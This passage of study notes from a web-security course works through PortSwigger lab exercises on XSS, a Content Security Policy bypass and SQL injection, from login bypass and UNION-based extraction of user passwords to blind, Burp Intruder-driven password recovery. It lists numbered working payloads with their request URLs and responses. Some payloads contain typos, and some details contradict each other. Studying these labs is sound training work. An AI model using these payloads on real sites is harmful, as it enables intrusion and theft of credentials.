the"test" from here, put open close, similar to what we do in html tags -> burp suite will substitue these $$ with the payloads we mentioned earlier 6) Then click on start attack 7) On clicking start attack, burp suite will go through payload options, substitute these two $$ with every single possibility in list GET ?search=
																								<$$> HTTP/1.1


8) Reason for doing this: we want to see which elements or which html tags are gonna be allowed and which one are not allowed in the text box  

9) In response, we can payload and status
-> we see 400 for most, we look for 200 which means success 
10) We can see body tag is getting 200 
11) Now we will turn off inruder,proxy and go to search and search with body tag:

Exploit: 6  <body>test</body>

we get response:0 search results for 'test>'

12) Thus body tag does not get filtered 
13) Now lets try body and some attribute
-> in cheatsheet lets copy events to clipboard and go to intruder
14) In positions , add body and in positions for payload to be entered, go to Payload options and paste the options 

GET /?search=<body%20§§> HTTP/2


-> Now click on startAttack and we can see resize is giving success with status 200 

14) Now we can try resize attribute and see if it allows to inject javascript code 

Exploit: 7 <body onresize=alert(3)>asdfhfhf</body> Output: 0 search results for'asdfhfhf' -> now we get 0 search results and hence nothing gets filtered -> Now if we resize, we get the alert screen triggered 15) Other uses of intruder: -> we can send any request to it from your proxy and you can put the specializers(§§) to any location within the request and then in the payloads you can put any payloads you want, click on start attack and it will substitute every single payload that we put in the positions ############Intruder steps######### 49) Injection Vulnerabilities 2 - XSS -ByPassing Content Security Policy - Analysing target application: Target website: https: portswigger.net web-security cross-site-scripting content-security-policy lab-csp-bypass a) Here target website uses CSP(Content Security Policy) -> Lets approach as if we dont know that the page has implemented CSP -> lets approach things in a black box manner ##Black box approach##### 1) Load the website, click on every button , manipulate every possible url parameter , manipulate every single input that you see - Visible and hidden ones 2) Check the search button , back button -> We discover many vulberabilities by clicking back button 3) Once we cover all these, we will test it for XSS , SQL injections and all kinds of vulberabilities 4) At the start we will try to do HTML injection i)
																										<b>Mahesh<b>

O/P:
0 search results for 'Mahesh'

-> On inspecting we will be able to see b tags injected properly 
-> Thus we have are able to do html injection here 

5) Next we will see if we are able to inject javascript in this html because we are basically able to inject code into the source code of the page and web browser is accepting this text that we type and it is rendering it properly 

6) So if we manage to inject javascript, which is a programming language we will be able to do much on webpage , hence it is a dangerous vulberability 

7) Lets try with simple javascript injection:

<script>alert(1)</script>

We will be getting output as: 
0 search results for ''

-> On inspecting we will be able to see our script being injected:

<section class="blog-header">
																													<h1>0 search results for '<script>alert(1)</script>'</h1>
																													<hr>
                    </section>
					
-> We are able to see javascript and it is not 
formatted in any way or it is not being filtered 


8) But for some reason, the javascript is not getting executed on this webpage 
-> When we enter the script code, we dont see the script code in message for search results 
-> This gives a hint , even though this did not work - page still does not understand whether whatever i have injected/typed is actually part of the page or part of the code  because if it knew, then it would have displayed it in "search results" message 

-> When we enter script, it does not get displayed, which hints that the web application does not know what to do with what i entered 


###################

50)  Injection Vulnerabilities 2 - XSS -ByPassing Content Security Policy - Discovering an XSS in a CSP enabled application:

a) Now to understand what is happening in previous lesson, lets go to burp proxy, start the interceptor  and send our alert request in search bar:

<script>alert(10)</script>

b) If we can see the request, we can find the below in search request due to url encoding :

eg:
GET /?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E HTTP/2


c) On further forwarding of the request, we can  see another request which has parameter called token 

eg: 
POST /csp-report?token= HTTP/2

-> Every time we see equal sign , it means that we can send user input after this parameter , then we can later use this parameter for all kinds of vulnerabilities 


eg:
POST /csp-report?token= HTTP/2
Host: 0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net
Cookie: session=rcopiuRaCqirlSI8PBS8mJVwToGnsC64
Content-Length: 664
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/csp-report
Accept: */*
Origin: https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: report
Referer: https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net/?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=4, i

{"csp-report":{"document-uri":"https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net/?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E","referrer":"https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net/?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E","violated-directive":"script-src-elem","effective-directive":"script-src-elem","original-policy":"default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=","disposition":"enforce","blocked-uri":"inline","line-number":46,"source-file":"https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net/","status-code":200,"script-sample":""}}




d) Now if we forward again, we will see this in the screen:

0 search results for ''

e) So far, we have discovered another parameter called token 

-> Now lets copy the new parameter token  and add it to the end of current url : &token=blablabla

From:
https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net/?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E


TO:
https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net/?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E&token=blablabla

f) Now if we inspect the code and see the page, we wont be to see the text blablabla
-> This does not mean that it is not returned in the response 

g) Similar to the way we use burp proxy to intercept requests, we can also use burp proxy to intercept responses also 

-> This can be done by : Proxy -> Options -> Intercept Server Responses -> Tick the box [Intercept Responses based on the following rules ]

#########
1) Now first we will get the request, which on forwarding we will be able to see the response 


eg:
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=m1Tjm79NqAznuyGvKbfdafYkw8mi9b1h; Secure; HttpOnly; SameSite=None
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=blablabla
X-Frame-Options: SAMEORIGIN
Content-Length: 3172

-> Now if we search for the text blablabla in response, we can find a match 
-> Whatever we type in token is getting injected in this line:

Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=blablabla



#########


********* CONTENT SECURITY POLICY *************
1) It is a browser feature that prevents XSS and other vulberabilities 
2) To enable it, response headers would include "Content-Security-Policy"
-> This is why in our example, web application is treating our user input as code and not as user input . 
-> But we see that the code is not getting executed on this page 

###################



h) This line specifies the content security policy :

We can see it is set to 'self'
-> object-src set to 'none'
-> script-src is set to 'self' 

i) Here  script-src is set to 'self'  is very important 

j) Content security policy is doing all these things here 

-> This is why in our example, web application is treating our user input as code and not as user input . 
-> But we see that the code is not getting executed on this page 

-> it is because of below line, our script is not working - even though it is injected

eg:
style-src 'self';

Reason: why javascript not working 
1) Response is enabling content security policy 
2) It is setting script-src to 'self'  

style-src 'self';


3) Setting this policy in Response-> csp means 'inline' javascripts are prevented in this web application  


k) We can override the value in CSP policy :
Instead of having script-src to 'self', we can have an option called "script-src-elem" 

-> We can use this option:"script-src-elem" , to overide the normal script source  

l) So instead of it being to set to self, we can set it to "unsafe-inline", which means we are enabling in line javascript 

eg: script-src-elem 'unsafe-inline' 

m) Hence we are going to change our  url 

from:
https://0a21001e03a5d4f183b2ffa800ca005b.web-security-academy.net/?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E&token=blablabla


to:
https://0a0a00bc04734d2280900398009f0006.web-security-academy.net//?search=%3Cscript%3Ealert%2810%29%3C%2Fscript%3E&token=;script-src-elem 'unsafe-inline'

n) Now we can see javascript enabled and our alert gets thrown 


51)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities:Discovering SQL Injections

-> Bottom concept: We look for places in web applications where we can manipulate the input 

a) All the arguments, parameters, post,get requests - which we  could manipulate as a user 
---> Should be tested for sql injections 

b) How do we perform the test?
1)  We try to inject a statement that returns  false - analyse what happens on the website, if the website breaks   
2) Try to inject a statement that returns true and that should not break the website 

3) if the True statement does not break the website 
   and  false statement breaks the website  - Then the website is actually accepting whatever we are giving it i.e it executes statements that we give it 

4) From there we can conclude that website is vulnerable to sql injections and then we can inject other queries that allow us to access the database or upload files or read files and so on. 

Target website:
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

5) Here in target website, we have a normal shop website and 
-> As we do before, we should test every feature of the website as a normal user 
-> See how the website works normally without exploiting the website 

6) Here on clicking accessories, we can see  in url  the category=Accessories 


https://0af2008703054b54805dee11005d00c5.web-security-academy.net/filter?category=Accessories

-> Also we can see title as Accessories 
-> If we change anything in request parameters for category it gets changed here also .

7) Hence before trying sql injections, we should try html injection and then try Xss Injection - because we have an user input directly reflected on the page 


c) Before going to sql injection, lets see on whats happening when we launch this url: https://0af2008703054b54805dee11005d00c5.web-security-academy.net/filter?category=Accessories

-> What happens is: We have an SQL query that is executed by the web application 

ORIGINAL STATEMENT: 
SELECT * from shop WHERE category = 'Food and Drink'


INJECTION TEST: 

SELECT * from shop WHERE category = 'Food and Drink' and 1=1--'

1) Here we add two minuses, to be used as a comment to comment the extra quote  that the web application  adds 
2) Here we know 1=1 is true, hence this statement wont affect the execution of this page 
3) Main thing to note is that:
->  we are manually adding a single quote to close the quote that the web application opens itself 
-> We are using a comment at the end to basically tell the web application to ignore the last quote that is added by the web application. 
4) Now lets change url like this :
-> Add single quote after Accessories:  Accessories'
-> Add and: and 
-> Add 1=1: 1=1
-> Add comment : --

Final modified url: 
https://0a3900d90349392f81d63ed3000d0029.web-security-academy.net/filter?category=Accessories'+and+1=1--


-> URL in browser after hitting:

https://0a3900d90349392f81d63ed3000d0029.web-security-academy.net/filter?category=Accessories%27+and+1=1--

-> Output in page:
Accessories' and 1=1--


5) Since we added this in url and we get this output in page, the page is exactly loading how it should be , Nothing changed in the page. 
-> This means that the statement that we added did not affect the execution of the page, which is what we are expecting - because it is true 


d) Now lets change the url to:1=0

SELECT * from shop WHERE category = 'Food and Drink' and 1=0--'


https://0a3900d90349392f81d63ed3000d0029.web-security-academy.net/filter?category=Accessories'+and+1=0--


URL in browser after hitting:
https://0a3900d90349392f81d63ed3000d0029.web-security-academy.net/filter?category=Accessories%27+and+1=0--

-> Output in page:
Accessories' and 1=0--

and page is broken , which means even though there is category called accessories - web application is not able to retrieve it and that's because we said 1=0, which is false and cause to break this select query 

-> Select query comes like this:

SELECT * from shop WHERE category = 'Food and Drink' and 1=0--'


52)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities:Bypassing Admin Login Using Logical Operators

a) We can look into how to communicate with database and start retrieving data from the database like usernames and passwords 

b) But before we do that, lets see an example of how we can bypass login page using very simple statements using AND, OR statements  , if they are vulnerable to sql injections 


Target website: https://portswigger.net/web-security/sql-injection/lab-login-bypass

c) In target lab, go to my account and enter the credentials: 
-> if you put wrong cred: admin/test  -> application will throw invalid username or password 
-> if you try to manipulate by putting test/'    , you will see something different: "Internal Server error" ,
---> not only ' we can try passwords like: AND 1=1  , OR 1=1 

d) We should always try to visualize what is happening at the backend  when you try to execute or load the page 
-> In our example, where we put in username/password and clicking at login - web application probably does something like this:

SELECT * FROM users WHERE username= '$username' and password = '$password' 

e) What we can do is 


SELECT * FROM users WHERE username= 'admin' and password = 'test' or 1=1--'

1)  If we evaluate this:

---->db engine is going to select a record where username is admin and password is test => Both these cases should be false 

or 

---> one equal to one which is true 

2) so anything or true is true 
-> Therefore regardless of what is happening in left side of "OR" condition in the where part, the web application is going to 
let you to login as admin - if it is vulnerable 


Exploit:8   ' or 1=1--


f) Now if we login as admin/' or 1=1--


-> Then we will be able to login into the application as: administrator 

-> This is very simple example of bypassing the login screen, using logical statements like OR, AND  
-> It is good example of showing how manipulating sql statements could be very useful 


g) These OR and AND statements are very userful for discovering sql injections, more than bypassing login screens 



52)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities:Selecting Data from the Database 
a) In this lesson we will see, how to start retrieving data from the database. 
-> In earlier lesson we saw, WEB SERVER has web application files which loads products from database and what we want to do is 
we want to inject an SQL statement in it to load data from the users table
-> So that hopefully get the user name and password for the admin. 
-> Thus even if the admin page is not vulnerable, we will be able to log in as normal admin 
-> We can do this, because we know whatever we post, whatever we put in here: 'Food and Drink' and 1=1--'  of  SELECT * FROM shop WHERE category = 'Food and Drink' and 1=1--'   is being executed by the web application is being sent to the DB engine and DB engine is executing that query 


ORIGINAL STATEMENT 
SELECT * FROM shop WHERE category = 'Food and Drink' 

INJECTION TEST 
SELECT * FROM shop WHERE category = 'Food and Drink' and 1=1--'


SELECT * FROM shop WHERE category = 'Food and Drink' and 1=0--'

b) We will be using UNION select queries to select data from the DB but before we do that, we need to determine the number of columns that being 
loaded 
-> This also can be used to discover SQL injections 
-> This should be another thing that we should do, to verify that the target page is vulnerable to SQL injection 

c) We know that if we add a apostrophe(') and 1=1, the page loads normally
-> If we add apostrophe(') and 1=0 , we can see that the page is breaking 

Exploit:9     ' AND 1=1--

d) Another test is to use the ORDER BY clause 

Exploit:10   ' ORDERBY 1

-> ORDER BY 1, means we should do ORDER By of the first column 

-> When you use this exploit, the page loads fine :

https://0a9f00c1035ceacf80666c2700bc00f5.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20ORDER%20BY%201--

Output: 
Clothing, shoes and accessories' ORDER BY 1--

e) If you change the order by to: 1000000000000, meaning we are trying to order by a column:1000000000000 which does not exist , then internal server 
error will be thrown:

Input URL:
https://0a9f00c1035ceacf80666c2700bc00f5.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20ORDER%20BY%201000000000000--


Output: 
Internal Server Error

Exploit:11   ' ORDERBY 1000000000000

f) So this is another way to know if this page is executing whatever SQL queries we are adding 
-> ORDER BY can also be used to determine the number of columns 
-> if we do ORDER BY 1, the page loads, 
    -> if we do ORDER BY with a really big number - the page breaks 
-> In our target lab, if we do ORDER BY 5, still we get Internal Server error and the page breaks 
---> This means that there is less than 5 columns 
-> If we do ORDER BY 3, page breaks but if we do ORDER BY 2, page loads - Hence we know that there is only two columns selected in here 

g) So once we identify that we have 2 columns, next we need to start building up our Union Select 
-> Because Union keyword allows us to run two select statements within the first query 

-> As we know web application is using the following SQL select statments:

ORIGINAL STATEMENT 
SELECT * FROM shop WHERE category = 'Food and Drink' 

INJECTION TEST 
SELECT * FROM shop WHERE category = 'Food and Drink' and 1=1--'


SELECT * FROM shop WHERE category = 'Food and Drink' and 1=0--'

h) Building the query step by step:

1) We will be injecting our statements in this place: and 1=1--', Hence we will say: union+select+ 
2) We need to see where we can inject the data, so that we can see it on the page: hence we put 1,2:  union+select+1,2,
-> Because we want to see where are we going to see 1 and 2 on the page - if the page is vulnerable 

3) Doing this , is not going to work :

https://0a44004a0482d68d8073945800d90041.web-security-academy.net/filter?category=Corporate+gifts+%27+union+select+1,2--

We will be getting: Internal Server Error in the response output 

4) If you have valid sql injection, the page should have loaded 
normally and we should have seen either 1 or 2 or both being displayed on the page 
-> In our case - this is not happening as the target is using  A DIFFERENT DATABASE ENGINE 

5) Hence lets try changing 1,2 to NULL, NULL :union+select+NULL,NULL,


https://0a44004a0482d68d8073945800d90041.web-security-academy.net/filter?category=Corporate+gifts+%27+union+select+NULL,NULL--

Response Output:
-> Now the page is loading and we are able to get the below response output: 

Corporate gifts ' union select NULL,NULL--

6) Exploit:12 ' UNION SELECT 1,2--   or ' UNION SELECT NULL,NULL--

7) We need to see where we can inject data so that we can see data on the page 
-> Now we have query for exploit as: ' UNION SELECT NULL,NULL--
-> We wanted to see where can we inject data, so instead of null, we will put 'a', hence exploit will be: UNION+SELECT+'a',NULL 

eg:
https://0a44004a0482d68d8073945800d90041.web-security-academy.net/filter?category=Corporate+gifts+%27+union+select+%27a%27,NULL--

-> We get output in screen as: Corporate gifts ' union select 'a',NULL--

-> also we get 'a" in the page below 

8) So since we get 'a' in the output page, if we substitute 'a' with actual value we want to select from database - then it will also get displayed 




i) Getting the db version in the output 

Exploit:13  '+UNION+SELECTVERSION,NULL--


eg:
https://0a44004a0482d68d8073945800d90041.web-security-academy.net/filter?category=Corporate+gifts+%27+union+select+version(),NULL--


o/P:
Corporate gifts ' union select version(),NULL--

PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

52)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities:Accessing the Database Admin Records 


Target: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

a) So we know the application is vulnerable to SQL injection and the next goal is to :
start selecting data from useful tables 
b) Hopefully from User table that contains user names and passwords :
c) First get list of all tables 

Exploit:14 '+union+select+table_name,null+from+information_schema.tables--


eg:
https://0a3f003f035e062981cecac70010001e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+union+select+table_name,null+from+information_schema.tables--

Response in page1 :
Clothing, shoes and accessories' union select table_name,null from information_schema.tables--


Response in page2:
pg_partitioned_table
pg_available_extension_versions
pg_shdescription
user_defined_types
udt_privileges
....


d) Then get the columns of that particular table :users


Exploit:15 '+union+select+column_name,null+from+information_schema.columns+where+table_name='users'--


Eg: url 
https://0a3f003f035e062981cecac70010001e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+union+select+column_name,null+from+information_schema.columns+where+table_name=%27users%27--


Response in page1:
Clothing, shoes and accessories' union select column_name,null from information_schema.columns where table_name='users'--


Response in page2:
email
password
username


e) Then get the username from that users table

Exploit:16 '+union+select+username,null+from+users--


Eg: url
https://0a3f003f035e062981cecac70010001e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+union+select+username,null+from+users--


Response in page1:
Clothing, shoes and accessories' union select username,null from users--


Response in page2:
carlos
wiener
administrator


f) Then get password from users table

Exploit:17 '+union+select+password,null+from+users--

Eg: url
https://0a3f003f035e062981cecac70010001e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+union+select+password,null+from+users--


Response in page1:
Clothing, shoes and accessories' union select password,null from users--


Response in page2:
w5lxr0e4pxm2lot241ln
0tctswl9w2s5zntc65uo
pkcjzv2dnbxzopz8oa21


g) User where statement 


Exploit:18 '+union+select+password,null+from+users+where+username='administrator'--

Eg: url
https://0a3f003f035e062981cecac70010001e.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+union+select+password,null+from+users+where+username=%27administrator%27--


Response in page1:
Clothing, shoes and accessories' union select password,null from users where username='administrator'--


Response in page2:
w5lxr0e4pxm2lot241ln


53)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities:Discovering Blind SQL Injection 

a) Blind SQL injections are very similar to classic SQL injections that we covered previously 
-> They basically allow an attacker to exploit the web application , run SQL queries. 
b) Only difference with blind SQL injections is that you will not see the result being displayed on screen because the result IS NOT RETURNED TO THE WEB APPLICATION , BUT THE 	query will be executed in the target Database 
c) Approach followed: login as administrator -> go to a product details page -> in request coookies it will display TrackingId and session -> in Query Parameters it will have productId 

d) We will test for SQL injections here 
-> To test for sql injections, we usually run a false and true statement 
-> False statement looks like this: '+anD+2=1-- 
   -> in other words : ' anD 2=1--
-> True statement looks like this: 1+anD+2=2--
   -> in other words: 'and 2=2--   

e) To run the false statment 
-> in BurpSuite-> proxy -> interceptor We will be pasting the exploit after the current value in tracking Id
->In request cookies -> TrackingId - 

 eg: dahehegfdkDseyw' anD 2=1-- 
 
-> On hitting forward, we see some button(Welcome Back)  getting disappeared in the UI - this is because we ran a false statemen
f) To run the true statement 
-> in BurpSuite-> proxy -> interceptor We will be pasting the exploit after the current value in tracking Id
->In request cookies -> TrackingId - 

 eg: dahehegfdkDseyw' anD 2=2-- 
 
 
-> On hitting forward, we see some button(Welcome Back)  gets appeared in the UI - this is because we ran a true statement 

g) So the conclusion is: If we run true statement, we see welcome back and if run false statement we dont see the welcome back 

h) This indicates that whatever we are injecting is being accepted by web application and is being executed on the database engine 

i) So in BLIND SQL INJECTION 

Normal Request  ----> Original Page

True Statement  ----> Original Page

False Statement  ----> Different/Broken Page


 54)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities:Enumerating Table and column names 
a) From the previous lesson - we know that our target is vulnerable.
 -> Next goal is to start selecting data from useful tables , like from users table that contains usernames and password 
b) Next thing to do, is to go ahead and try exploiting it using same sql queries which we used in previous lesson. 
-> you will notice that it will not work, because this is a blind sql injection example - hence no results will be seen on screen.  
c) We know so far that - when we execute a true statement - we see welcome back and when we execute a false statement - we dont see the welcome back 
-> We can use this to actually check if a specific table exists on the page 

eg: we will ask these questions :
1) Do we have a table that is called X? 
2) If yes, Do we have a column that is called Y in X table ?
3) Do we have a  value in table X .
By this way we can ask - Do we have a table called users? If we get welcome back - that will mean that we have a table called users 
-> Then we will ask if the table users, contain the user called administrator 
4) If we get welcome back, then its confirmed that users table contain a user called administrator 
 and then we are going to check if the administrator password starts with "a", if we get a welcome back , then go on to next character and get the whole password by this way 
5) So basically we will not able to see the results on the screen. 
->We are simply going to be asking the DB engine with true or false questions and based on the answer we get - whether we see Welcome back - we will know that the answer is true 
-> If we dont get welcome back then the answer is false  and we can ask it a different question, which is a huge limitation 
-> But we will still manage to get the username and password of the user or admin using this vulnerability with the help of Burp suite 

6) We will be using Repeater and Intruder to achieve the same. 

d) So lets come to our first question: Do we have a table called X?  ' andD 2=2-- 

1) Below statement uses the above logic and checks if users table exists or not 

(SELECT 'a' FROM users LIMIT 1)='a'--
         |
		 |
	'a' = 'a'--
	     |
		 |
		True 
		
2) Our exploit turns out to be:

Exploit:19  ' anD (SELECT 'a' FROM users LIMIT 1)='a'--


e) Now if we use this along with tracking id like last example with burpsuite/proxy: 


 eg: dahehegfdkDseyw' anD (SELECT 'a' FROM users LIMIT 1)='a'--
 
-> On forwarding the result, we can see "Welcome back" in screen, which means that we have a table called users 

f) lets do a false example check here 

-> Load the same page again
-> Use the same exploit , but instead of users table, mention a table that does not exist 

eg:
dahehegfdkDseyw' anD (SELECT 'a' FROM users322 LIMIT 1)='a'--

-> On forwarding the result, we wont be able to see "Welcome back" in screen which means we dont have a table called users 


g) Next step is to ask if we have a column called Y in the X table? 
-> Now we check for two things: check if we have a column called username and if we have a username that is called 'administrator' 

-> The below query in brackets will return 'a' only if there is table called users, it has column with username and one of the username is 'administrator' 

Exploit:20  ' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--


eg:
dahehegfdkDseyw' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--

-> On forwarding the result, we can see "Welcome back" in screen, which means that we have a table called users, which has column called username and that username has 'administrator' as a value 

h) Next step is to guess or get the password 
1) First thing we should do is to determine the length of the password  

-> So statements within bracket will evaluate to 'a' if all statements were true 

Exploit:21 ' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1='a'--

-> -> On forwarding the result, we can see "Welcome back" in screen, which means that we have a table called users, which has column called username and that username has 'administrator' as a value and the password has length greater than 1 


-> Now by trial and error we can increase the check for length of password and found that password length is 10

Exploit:22 ' anD (SELECT 'a' FROM users WHERE username='administrator' AND (LENGTH(password)=20)='a'--
 
-> -> On forwarding the result, we can see "Welcome back" in screen, which means that we have a table called users, which has column called username and that username has 'administrator' as a value and the password has length equal to 20 

55)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities: Recovering Administrator Password With Burp Intruder

-> Until now we determined that there is a table called user with username administrator and it has password whose length is 20

-> Next step is to determine the value of password 

a) You could use a work list of passwords of length 20 and have a script that goes through them or use the intruder functionality of Burp to go throught the passwords 

-> But there is a better way, because if you do the above mentioned way - we are simply doing word list attack 


b) We can do a brute force attack for the same
c) We will use the same idea, by asking questions 


1) 
Is the first character of the password "a" 
Is the first character of the password "b" 
Is the first character of the password "c" 

-> if the first character matches, we will go for the second third and fourth characters.
-> If first character is not matched, go to the next character b and so on. 

d) Lets use Burp intruder for the same 
-> Using the intercepted request in proxy -> send it to Intruder 
e) In intruder $$ signs tell the burp suite inruder, that this is a placeholder
-> in our request we will have placeholder for payload in trackid section 

f) 
-> Here we do substring operation and check if first character is "a"

' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND (LENGTH(password)=20)='a'--

-> We dont need check length of password hence removing it  

Exploit:23 ' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

-> here we are checking if the substring operation is  returning 'a' 
-> Note SUBSTRING is a sql function, that takes a string and  takes the first character and check if it is 'a' 
-> Then as we go we will be replacing the check character on right as b, c ,d etc 


' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND (LENGTH(password)=20)='b'--


' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND (LENGTH(password)=20)='c'--


g) We do this until one of the character shows welcome back in the screen and then we move to the next character 

h) Cool thing about intruder is that it can replace values  that you enclose in $$ with this character and burp will automatically send requests (one request at a time) , go through the alphabet starting at A to Z 
-> Then we can analyze the results and know the value for the first character using intruder easily 
-> In payloads of intruder, we will add all the letter list 
-> lets have:
Payload set: 1
Payload type: bruteforcer 
Payload Options(bruteforcer) -> Character set: abcdefghijklmnopqrstuvwxyz0123456789 
min length:1
max length:1 

-> Then hit start attack 


i) If we analyse the outputs we can see "Welcome back" to only one of the inputs  , hence the first character is identified


' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND (LENGTH(password)=20)=$a$--

j) Thus we found the first character, then for the second character we need to change query below:

Exploit:24
' anD (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator' AND (LENGTH(password)=20)=$a$--

k) Thus we could check all the characters, but this method takes a lot of time 

l) Hence we make use of python script or Cluster Bomb attack for the same 
 

56)  Injection Vulnerabilities 3 -SQL Injection Vulnerabilities: Using the Cluster-Bomb Attack to Recover Passwords

a) In this lecture, we will see how to use the cluster bomb option of intruder to manipulate 2 values at the same time 
-> With this option we can configure the intruder to go 
through all the alphabet to guess the first character of password and then automatically increase the number in here(SELECT SUBSTRING(password,2,1)) to guess the 2nd,3r,4th and so on  


' anD (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator' AND (LENGTH(password)=20)=$a$--

b) This cluster bomb technique will help us to recover the full password in one go. 
-> Here we say recover and not gues because : even though we guess the characters, we cover all the possibilities , thus we are guaranteed to recover the password by the ned of attack 

c) Here we have "a" to tell the burp intruder to replace this "a" in ($a$--) with all of the possible alpha numeric characters 

eg:
' anD (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator' =$a$--


-> We can also do in here -> SUBSTRING(password,$1$,1)
-> Where we say one to start with,  and then tell burp  to go from 1,2,3 .. upto 20 

eg:
' anD (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator' AND (LENGTH(password)=20)=$a$--


d) THus this time we change two variables:
1) We are changing the character that we are selecting from the password   - (SELECT SUBSTRING(password,$1$,1) 
2) We are changing the value that we are comparing this character also  - $a$--

e) Now we will go back to burp Intruder -> Positions -> Payload Positions and changing:

1) First Payload: 
 SUBSTRING(password,$1$,1)
 
2) Second Payload 
username='administrator' =$a$--

3) Final payload:

Exploit:25
' anD (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator' =$a$--

e) Since we have two values changing, we need to change the attack type from: Sniper to Cluster Bomb 

f) Then from Positions tab, we should go to Payloads tab -> Payload Sets 

1) In first set we are changing the number and not the alphabet :

Payload Set: 1
Payload type: Numbers 

Payload Options(Numbers)
Type: Sequential 
From: 0
To:20
Step: 1  

2) In second Payload set , we are manipulating the letters in here 

Payload Set: 2
Payload type: Brute forcer 

Payload Options(Brute forcer)
Character Set: abcdefghijklmnopqrstuvwxyz0W123457890
Min Length: 1  Payload count: 36
Max Length: 1  Request count: 756 

-> Here we will have request count 756 to figure out 20 character password 

g) Then we do start attack.
-> Intruder has finished working, and we are able to see the Requests with Payload 1 which are numbers and Payload 2 which are alphabets. 
We get status 200 and with regards to length: most of the requests have the same length(3949)
-> But if you scroll down, you will see some of them having a different length (4019) 

h) This should be an indication that the response was little bit different 
-> If we look at the reponse and search for "Welcome back" -> you will be able to find it in search 
-> That is an indicator for us to know that the result was true, meaning that - whatever character that we are trying to guess in this request is valid 

i) here if see: In payload2 , we can see that the character is "b" and Payload1 is 10 meaning that it is at the 10 th position of the password 

-> Thus we found that the 10th character in the password is the letter "b" 

j) Instead of having to look through all of the requests , we can sort the requests by length  and now we will have all the requests that have the length as 4010 and we can see all of them contain the text "Welcome back" 
-> Thus we have the Position in Payload1 and Character in Payload 2 

k) So once we have this data, all we have to do is :
1) Open a txt file and put them 1 by 1 in the order from 1 to 20 from Payload1 and Payload 2 
2) thus we obtain a 20 character strong password here: 
n9d7pvfpwbg8h6doktxn 



57)  Injection Vulnerabilities 3 - Time Based SQL Injection - Discovering Time based Blind SQL Injection 

a) In this lesson we will be talking about time based SQL injections 
-> In the previous example when we injected SQL code, that resulted in a false the page changed -
-> so even though we did not see any errors on the page, the page acted differently depending on the input that we are passing to it 

b) In this example, page will always remain the same. Nothing will change about the page 

Targetwebsite: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

-> In previous example, in intruder when we changed TrackingId and added the exploit, we got "Welcome back" for collect exploit and we did not get that text for wrong exploit 
-> Thus the page gets changed based on the input for previous example 
-> Hence in that lesson, we did  a lot of trial and error 

c) Because we are not able to see any changes on the page when we send it different kinds of input , even though we did an sql injection actually and execute an SQL code in the DB , We are not able to see anything on the page that will tell us " that we have done sql injection successfully ' 
d) Hence we can send an SQL command or query to the database engine and simply tell it to wait for 10 seconds or sleep for 10 seconds 
-> Therefore if we notice that the page is loading slower than usual - then we can infer that the page is actually executing SQL statements -  but it simply does not return the results 

e) SO in target website, so far we have tried all sorts of injections. 
-> The pages always loads the same 
